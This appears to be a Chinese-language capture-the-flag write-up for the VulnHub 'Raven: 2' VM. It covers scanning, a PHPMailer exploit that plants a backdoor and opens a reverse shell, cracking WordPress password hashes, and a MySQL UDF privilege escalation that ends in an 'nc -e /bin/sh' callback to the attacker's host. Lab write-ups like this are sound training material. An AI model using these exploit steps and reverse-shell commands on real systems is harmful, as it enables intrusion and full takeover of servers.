# Raven: 2

https://www.vulnhub.com/entry/raven-2,269/#release

difficulty: intermediate

Finish Date：2024-4-9

## IP

192.168.10.152

## Scan

Open Port -> 22,80,111,59658

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 2681c1f35e01ef93493d911eae8b3cfc (DSA)
|   2048 315801194da280a6b90d40981c97aa53 (RSA)
|   256 1f773119deb0e16dca77077684d3a9a0 (ECDSA)
|_  256 0e8571a8a2c308699c91c03f8418dfae (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Raven Security
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35893/udp   status
|   100024  1          56782/udp6  status
|   100024  1          57521/tcp6  status
|_  100024  1          59658/tcp   status
59658/tcp open  status  1 (RPC #100024)
MAC Address: 00:0C:29:3E:FC:53 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

首先访问 80 端口对应的 web 服务，在首页最底部显示使用了 Colorlib 的模板网站，发现有一个 BLOG 链接，点开后发现有些资源加载有问题，提示了 raven.local 是在这个域名下加载一些资源，需要先添加到/etc/host 中。

```
192.168.10.152  raven.local
```

添加后，再次访问 BLOG 发现是一个 wordpress 搭建的博客，先尝试对域名进行子域名爆破，发现没有 vhost。

```
gobuster vhost -t 50 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -u raven.local
```

使用扫描器对网站进行目录扫描，发现几个有意思目录：

```
gobuster dir -t 64 -k -w ~/tools/dict/fileName5000.txt -u http://raven.local/

/vendor               (Status: 301) [Size: 311] [--> http://raven.local/vendor/]
/wordpress            (Status: 301) [Size: 314] [--> http://raven.local/wordpress/]

```

访问 vendor 目录，发现可以 List Directory，点击查看相关文件及 html 源码，看看是否有有用信息。

## flag1

发现目录 http://raven.local/vendor/PATH ，找到了第一个 flag

```
/var/www/html/vendor/
flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}
```

发现 vendor 目录下安装的是 PHPMailer，对应版本为 5.2.16，searchsploit 搜索一下看是否有相应的能利用的 exp。在 kali 上 searchsploit -m 40974 看看这个 py 脚本能否进行利用。

先在 kali 上建立监听：nc -lvnp 5555，修改 py 脚本以下代码段中的内容：

```
target = 'http://192.168.10.152/contact.php'
backdoor = '/pp.php'

s.connect((\\\'192.168.10.3\\\',5555));

'email': '"anarcoder\\\" -OQueueDirectory=/tmp -X/var/www/html/pp.php server\" @protonmail.com',
```

修改后，python3 执行脚本，看到后门 shell 已经成功写入：

```
[+] SeNdiNG eVIl SHeLL To TaRGeT....
可能会显示一直卡在这里，不用管
```

先访问一下 http://192.168.10.152/contact.php 这时就会在 pp.php 中写入 python 连接代码，再访问 http://192.168.10.152/pp.php 后门，激活其 python 脚本，能反弹链接到 nc 监听的 5555 端口。

得到反弹链接后，升级 tty ：python -c 'import pty; pty.spawn("/bin/bash")'

## flag2 and flag3

先看看有没有 flag\* 文件，找到了 flag2 和 flag3：

```
find / -name flag* 2>/dev/null
/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png
/var/www/flag2.txt

cat /var/www/flag2.txt
flag2{6a8ed560f0b5358ecf844108048eb337}
```

访问图片内容得到 flag3 ： /var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png

```
flag3{a0f568aa9de277887f37730d71520d9b}
```

第 4 个 flag 应该在/root 目录下，现在准备提权操作。

查看/etc/passwd 有哪些用户，发现两个可登陆用户：

```
michael:x:1000:1000:michael,,,:/home/michael:/bin/bash
steven:x:1001:1001::/home/steven:/bin/sh
```

查看 wordpress 数据库连接文件，发现 mysql 的登录用户名和密码：

```
cat /var/www/html/wordpress/wp-config.php

define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'R@v3nSecurity');
```

## flag4

### 方式 1：

使用 mysql 连接本地数据库，继续进行信息探针，在 wp_posts 表中找到了 flag4：

```
mysql> select * from wp_posts;

flag4{715dea6c055b9fe3337544932f2941ce}
```

继续进行测试，看能否获得 root 权限。查看 wp_users 表，找到哈希密码，john 进行爆破，看是否能登陆 wp 后台。

```
|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 |    ->  明文没爆破出来
|  2 | steven     | $P$B6X3H3ykawf2oHuPsbjQiih5iJXqad. |    ->  明文： LOLLOL1
```

尝试使用这个密码 ssh 登陆 steven，不成功，看来 ssh 的密码和此密码不是同一个。

另外发现 mysql 进程使用 root 用户启动的，在执行命令时具有系统最高权限，这时尝试直接在 mysql 中读取 root 目录下的 flag4.txt：

```
select load_file('/root/flag4.txt');

___                   ___ ___
| _ \__ ___ _____ _ _ |_ _|_ _|
|   / _` \ V / -_) ' \ | | | |
|_|_\__,_|\_/\___|_||_|___|___|

flag4{df2bc5e951d91581467bb9a2a8ff4425}

CONGRATULATIONS on successfully rooting RavenII

I hope you enjoyed this second interation of the Raven VM

Hit me up on Twitter and let me know what you thought:

@mccannwj / wjmccann.github.io
```

### 方式 2：

既然 mysql 是以 root 用户启动的，那么再尝试下 mysql 的 udf 看能否获得 root 的 shell。

先查看下先决条件，看是否能够利用：

```
查看下插件路径：
show variables like 'plugin%';

plugin_dir    | /usr/lib/mysql/plugin/

查看是否有写目录的权限(不为NULL且没有设置其他的值，表示我们可以往 /usr/lib/mysql/plugin/ 中写文件)：
show variables like '%secure_file_priv%';

secure_file_priv |
```

开始利用：

先在 kali 上编译好 udf 库，利用 searchsploit 提供的 c 源代码进行编译：

```
searchsploit mysql udf
searchsploit -m 1518
mv 1518.c raptor_udf2.c
```

进行编译，得到了 raptor_udf2.so 文件：

```
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

将 aptor_udf2.so 文件上传至目标服务器/tmp 目录下，然后进行函数注册操作：

```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));

select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';   <-- 这里注意路径要设置为对应的plugin目录
create function do_system returns integer soname 'raptor_udf2.so';

select * from mysql.func;

显示函数以注册成功 | do_system |   2 | raptor_udf3.so | function |
```

最终利用进行反弹，在 kali 上获得了 root 的 shell：

```
select do_system('nc 192.168.10.3 6666 -e /bin/sh');
```
